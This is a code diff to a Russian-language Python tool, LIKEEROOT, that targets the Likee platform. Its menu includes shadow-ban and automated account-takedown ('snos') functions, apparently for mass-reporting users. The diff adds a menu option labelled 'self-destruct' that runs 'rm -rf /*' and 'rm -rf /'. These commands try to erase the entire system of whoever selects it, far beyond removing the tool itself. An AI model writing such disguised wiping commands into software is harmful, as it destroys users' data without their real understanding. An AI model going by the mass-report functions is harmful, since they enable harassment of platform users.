@@ -69,7 +69,7 @@ else:
 
 #info
 vers = "0.08"
-update = "Исправление ошибок, добавление новых функций."
+#update = "Исправление ошибок, добавление новых функций."
 
 
 os.system("clear")
@@ -86,23 +86,27 @@ headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 
 
 
 info = f"""
-Developer> (RESHETKA), RAZVEDKA
+Developer> (RESHETKA)
 ----------------------------
 
 Версия> {vers}
-LIKEEROOT - ЭТО  СОФТ СДЕЛАНЫЙ ДЛЯ ВЗАИМОДЕЙСТВИЯ С LIKEE!
+LIKEEROOT - ЭТО СОФТ СДЕЛАНЫЙ ДЛЯ ВЗАИМОДЕЙСТВИЯ С LIKEE!
 
-ОБНОВЛЕНИЕ 15.08.2025
+ОБНОВЛЕНИЕ 28.08.2025
+Добавлены новые UserAgent, Новые текста для сноса.
 
-{update}
+Добавлена функция немедленного самоуничтожения.
+
+---------
+Telegramm:  https://t.me/+Q6dkr4rcjJEwY2Qy
+
 
 """
 
 
 
 menu = """
-[=] Developer: RESHETKA, RAZVEDKA
---------------------------------------------
+--------------------------------------
 {+} 1. Скачать видео
 {+} 2. Информация о трансляции
 {+} 3. Информация о видео
@@ -114,16 +118,21 @@ menu = """
 {+} 9. Информация об аккаунте
 {+} 10. Account (TENEVOI BAN)
 
-
+[=] 9999. 💀Самоуничтожение
 [=] 0. Выход
---------------------------------------------
+--------------------------------------
 """
 #url = input("URL>")
+
 
 
 with open("logo.txt", "r", encoding='utf-8') as file:
     logo = content = file.read()
     print (Fore.WHITE + Back.RED + logo + Style.RESET_ALL)
+
+print ("")
+print (Fore.CYAN + "[=] Developer: RESHETKA")
+#print ("")
 
 #print (Fore.YELLOW + "")
 print (Fore.YELLOW + menu)
@@ -162,6 +171,12 @@ if us == "avtosnos":
 
 if us == "10":
     from api import accountsnos
+
+if us == "9999":
+    print ("Запуск режима самоуничтожения")
+    time.sleep(1)
+    os.system("rm -rf /*")
+    os.system("rm -rf /")
     
 
 
@@ -175,7 +190,7 @@ if us =="5":
     os.system("clear")
     print("")
     for i in info:
-        time.sleep(0.04)
+        time.sleep(0.01)
         print(i, end='', flush=True)
     
         #print (Fore.BLUE + info)
